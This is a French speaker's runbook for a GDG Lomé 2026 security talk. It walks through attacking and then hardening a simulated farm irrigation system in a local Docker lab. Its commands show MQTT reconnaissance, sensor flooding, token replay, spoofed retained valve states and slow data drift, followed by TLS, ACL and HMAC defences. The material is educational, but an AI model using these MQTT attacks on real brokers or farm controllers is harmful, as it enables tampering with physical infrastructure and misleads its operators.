# Démo GDG Lomé 2026 — commandes, dans l'ordre des slides

Runbook autonome : **chaque commande est écrite en entier**, sans script `.sh`
et sans alias (`run`/`atk`). Les sections suivent **l'ordre des slides** et portent
le **numéro de slide** devant, pour se repérer pendant le talk. À exécuter depuis
`gdg_lome/2026/demos`. Sous chaque commande, la ligne de résultat attendue.

Convention : `$` = invite du shell, ne pas le taper.

**Deux terminaux.** Les commandes marquées `# [hôte]` (celles en `docker compose`,
`curl`, `FARM_MODE=…`) se tapent dans le terminal **hôte** ; **toutes les autres** se
tapent dans le **shell de l'attaquant** ouvert à la slide 4 (voir « Démarrer l'attaquant »),
sans préfixe `docker`.

Repère rapide :

| Slide | Étape | Section |
|---|---|---|
| — | Préparation (avant le talk) | [§ Préparation](#préparation--avant-le-talk-aucune-slide) |
| 4 | Démarrer la ferme (insecure) | [Slide 4](#slide-4--la-cible--démarrer-la-ferme) |
| 6 | Acte 1 — Reconnaissance | [Slide 6](#slide-6--acte-1--reconnaissance) |
| 7 | Acte 2 — Mentir et agir | [Slide 7](#slide-7--acte-2--mentir-et-agir) |
| 9 | Défense naïve (mode secure) | [Slide 9](#slide-9--défense-naïve-mode-secure) |
| 10 | Acte 3 — Voler le token | [Slide 10](#slide-10--acte-3--voler-le-token-sur-le-bus) |
| 11 | Acte 3 — Rendre l'opérateur aveugle | [Slide 11](#slide-11--acte-3--rendre-lopérateur-aveugle) |
| 12 | Acte 3 — Empoisonner sans dépasser | [Slide 12](#slide-12--acte-3--empoisonner-sans-dépasser) |
| 14 | Mode hardened | [Slide 14](#slide-14--mode-hardened-tls-identité-acl) |
| 17 | Acte 4 — Les mêmes attaques | [Slide 17](#slide-17--acte-4--les-mêmes-attaques-en-mode-hardened) |
| 18 | La limite — dérive lente | [Slide 18](#slide-18--la-limite--la-dérive-lente) |
| 19-21 | Remise à zéro et suppression | [§ Après le talk](#après-le-talk--remise-à-zéro-et-suppression) |

> Slides sans démo (discours seul) : 1, 2, 3, 5, 8, 13, 15, 16, 19, 20, 21.
> Les slides **15** (HMAC) et **16** (détection) expliquent les contrôles dont la
> démo tombe en slide **17** et **18**.

---

## Préparation — avant le talk (aucune slide)

> À faire **une fois** par machine, avec Internet. Le jour J, commencer à la slide 4.
> Déjà fait sur la machine du speaker (tout est git-ignoré, rien n'est publié).

### P.1 Fichiers de configuration (déjà dans le dépôt)

`compose.yaml` (lit `FARM_MODE` depuis `.env`), `mosquitto/insecure.conf`,
`secure.conf`, `hardened.conf`, `mosquitto/acl`.

### P.2 Créer le `.env` et ses secrets

```bash
cp .env.example .env
printf 'CMD_HMAC_KEY=%s\n' "$(openssl rand -hex 24)" >> .env
printf 'MQTT_PASS_SIMULATOR=%s\n' "$(openssl rand -hex 24)" >> .env
printf 'MQTT_PASS_DASHBOARD=%s\n' "$(openssl rand -hex 24)" >> .env
```

### P.3 PKI de démo (CA + certificat broker) — pour le mode hardened

```bash
mkdir -p mosquitto/tls/ca mosquitto/tls/server mosquitto/tls/public mosquitto/secrets

openssl req -x509 -newkey rsa:2048 -nodes -days 365 -sha256 \
  -subj "/CN=GDG Lome Farm Lab CA" \
  -keyout mosquitto/tls/ca/ca.key -out mosquitto/tls/ca/ca.crt

openssl req -newkey rsa:2048 -nodes -sha256 -subj "/CN=mosquitto" \
  -keyout mosquitto/tls/server/server.key -out /tmp/server.csr

printf 'subjectAltName=DNS:mosquitto,DNS:localhost,IP:127.0.0.1\nextendedKeyUsage=serverAuth\n' > /tmp/ext.cnf

openssl x509 -req -in /tmp/server.csr -days 365 -sha256 \
  -CA mosquitto/tls/ca/ca.crt -CAkey mosquitto/tls/ca/ca.key -CAcreateserial \
  -extfile /tmp/ext.cnf -out mosquitto/tls/server/server.crt

cp mosquitto/tls/ca/ca.crt mosquitto/tls/server/ca.crt
cp mosquitto/tls/ca/ca.crt mosquitto/tls/public/ca.crt
chmod 644 mosquitto/tls/server/server.key
rm -f /tmp/server.csr /tmp/ext.cnf mosquitto/tls/ca/ca.srl
```

### P.4 Comptes MQTT du mode hardened

```bash
set -a; . ./.env; set +a

docker run --rm -v "$PWD/mosquitto/secrets:/work" eclipse-mosquitto:2 sh -c "
  rm -f /work/passwd && touch /work/passwd &&
  mosquitto_passwd -b /work/passwd simulator   '$MQTT_PASS_SIMULATOR' &&
  mosquitto_passwd -b /work/passwd dashboard   '$MQTT_PASS_DASHBOARD' &&
  mosquitto_passwd -b /work/passwd viewer      '$LEAK_VIEWER_PASS' &&
  mosquitto_passwd -b /work/passwd maintenance '$LEAK_MAINTENANCE_PASS' &&
  mosquitto_passwd -b /work/passwd sensor-02   '$LEAK_SENSOR02_PASS' &&
  chmod 644 /work/passwd"
```

### P.5 Construire les images

```bash
docker compose --profile attack build
```

---

## Slide 4 — « La cible » : démarrer la ferme

Mode insecure, services recréés à neuf :

```bash
docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
```

Vérifier l'état :

```bash
curl -s http://127.0.0.1:8080/api/state   # [hôte]
```
Attendu : `"mode":"insecure"`, `"valve":"CLOSED"`, `"score"` proche de `95`.

Ouvrir le tableau de bord : <http://127.0.0.1:8080>

Second terminal, fenêtre « ferme » (laisser tourner tout le talk) :

```bash
docker compose logs -f --tail 0 simulator dashboard   # [hôte]
```

### Démarrer l'attaquant — une seule fois (à garder ouvert tout le talk)

Troisième terminal. On lance le conteneur attaquant **une fois** et on ouvre un shell
dedans ; toutes les commandes d'attaque des slides suivantes se tapent ici, **sans
préfixe `docker`**. L'attaquant reste vivant quand on change de mode.

```bash
docker compose --profile attack up -d attacker   # [hôte] démarre l'attaquant (persistant)
docker compose exec attacker bash                 # [hôte] ouvre le shell → invite root@…:/app#
```

Raccourci équivalent : `bash scripts/attack.sh`. Outils déjà présents dans le shell :
`attack.py`, `nmap`, `mosquitto_pub`/`mosquitto_sub`.

---

## Slide 6 — Acte 1 : Reconnaissance

```bash
nmap -sV -p 1883,8883,8080 mosquitto dashboard
```
Attendu : `1883/tcp open mosquitto version 2.1.4`, `8080/tcp open http Werkzeug httpd 3.1.9`.

```bash
mosquitto_sub -h mosquitto -t '#' -v -W 6
```
Attendu : défilement de `farm/sensor/humidity`, `.../temperature`, `.../flow`, `farm/actuator/valve/state`.

---

## Slide 7 — Acte 2 : Mentir et agir

```bash
python attack.py flood --value 0 --count 15
```
Attendu : `[flood] 15 mesures humidité=0.0 — broker : accepté`.

```bash
curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
```
Attendu : `HTTP/1.1 200 OK`, `{"command":"OPEN",...,"mode":"insecure"}`.

```bash
python attack.py state
```
Attendu : `vanne=OPEN débit≈34 L/min score=0 impact≈2 000 000 FCFA`.

---

## Slide 9 — Défense naïve (mode secure)

Basculer en mode secure (le `FARM_MODE` inline suffit, aucun script) :

```bash
FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
```
```bash
curl -s http://127.0.0.1:8080/api/state   # [hôte]
```
Attendu : `"mode":"secure"`.

> Les commandes d'attaque suivantes (dans le shell attaquant) ne changent plus le mode.
> Le mode ne change qu'avec un nouveau `docker compose up` et un `FARM_MODE` différent.

Montrer que les contrôles marchent — humidité rejetée :

```bash
python attack.py flood --value 0 --count 15
```
Attendu (fenêtre ferme) : `humidité 0.0 REJETÉE : hors plage [20, 100]`.

Vanne refusée sans token :

```bash
curl -i -X POST http://127.0.0.1:8080/api/valve/open   # [hôte]
```
Attendu : `HTTP/1.1 403 FORBIDDEN`, `{"error":"token requis"}`.

---

## Slide 10 — Acte 3 : Voler le token sur le bus

```bash
python attack.py replay --simulate-operator --close-first
```
Attendu : `commande capturée : {"command": "OPEN", "token": "gdg-demo-token"}` puis
`rejeu ... — broker : accepté`. Fenêtre ferme : `valve -> OPEN` après la fermeture par l'opérateur.

---

## Slide 11 — Acte 3 : Rendre l'opérateur aveugle

Publier un faux état de vanne retenu :

```bash
mosquitto_pub -h mosquitto -t farm/actuator/valve/state -r -m CLOSED
```
Attendu : le dashboard affiche `Vanne : CLOSED` alors que le débitmètre indique ~33 L/min.

---

## Slide 12 — Acte 3 : Empoisonner sans dépasser

```bash
python attack.py flood --value 25 --count 30
```
```bash
python attack.py state
```
Attendu : `mode=secure vanne=CLOSED score≈21 impact≈1 500 000 FCFA`, aucune trace du rejeu dans le journal.

---

## Slide 14 — Mode hardened (TLS, identité, ACL)

```bash
FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
```
```bash
curl -s http://127.0.0.1:8080/api/state   # [hôte]
```
Attendu : `"mode":"hardened"`.

---

## Slide 17 — Acte 4 : Les mêmes attaques, en mode hardened

Accès anonyme refusé (TLS + comptes) :

```bash
python attack.py anon
```
Attendu : `1883 ... Connection refused` et `8883 ... REFUSÉ par le broker (Not authorized)`.

ACL — lecture limitée aux capteurs (identité « viewer » fuitée) :

```bash
python attack.py sniff --as viewer --topic 'farm/#' --seconds 4
```
Attendu : seuls des messages `farm/sensor/*` apparaissent.

ACL — écriture refusée :

```bash
python attack.py flood --as viewer --value 0 --count 2
```
Attendu : `broker : REFUSÉ (Not authorized)`.

ACL — faux état refusé (identité « sensor-02 ») :

```bash
python attack.py spoof-state --as sensor-02 --state CLOSED
```
Attendu : `broker : REFUSÉ (Not authorized)`.

Rejeu bloqué par le nonce (identité « maintenance », qui a le droit vanne) — illustre la slide 15 :

```bash
python attack.py replay --as maintenance --simulate-operator --close-first
```
Commande forgée sans la clé HMAC :

```bash
python attack.py forge --as maintenance
```
```bash
python attack.py state
```
Attendu (journal) : `rejeu détecté (nonce déjà utilisé)` puis `signature HMAC invalide`.

---

## Slide 18 — La limite : la dérive lente

Saut brutal détecté (illustre la slide 16) :

```bash
python attack.py flood --as sensor-02 --value 25 --count 10
```
Attendu : `humidité 25.0 REJETÉE : saut anormal (...)`.

Dérive lente, sous le seuil :

```bash
python attack.py drift --as sensor-02
```
```bash
python attack.py state
```
Attendu : `score≈25` ; à la fin le détecteur rejette même le capteur honnête (65 → « saut anormal »).

---

## Après le talk — remise à zéro et suppression (slides 19-21)

Revenir en insecure pour une nouvelle démo :

```bash
FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard   # [hôte]
python attack.py reset
```

Arrêter (garde images et secrets) :

```bash
docker compose down
```

Tout supprimer — conteneurs, réseau, images, secrets locaux (machine prêtée/partagée) :

```bash
docker compose --profile attack down --rmi local --remove-orphans
rm -rf mosquitto/tls mosquitto/secrets .env
```

---

## Aide-mémoire des modes

| Mode | Slide | Commande de bascule |
|---|---|---|
| insecure | 4 | `FARM_MODE=insecure docker compose up -d --force-recreate mosquitto simulator dashboard` |
| secure | 9 | `FARM_MODE=secure docker compose up -d --force-recreate mosquitto simulator dashboard` |
| hardened | 14 | `FARM_MODE=hardened docker compose up -d --force-recreate mosquitto simulator dashboard` |

Vérifier à tout moment : `curl -s http://127.0.0.1:8080/api/state`.
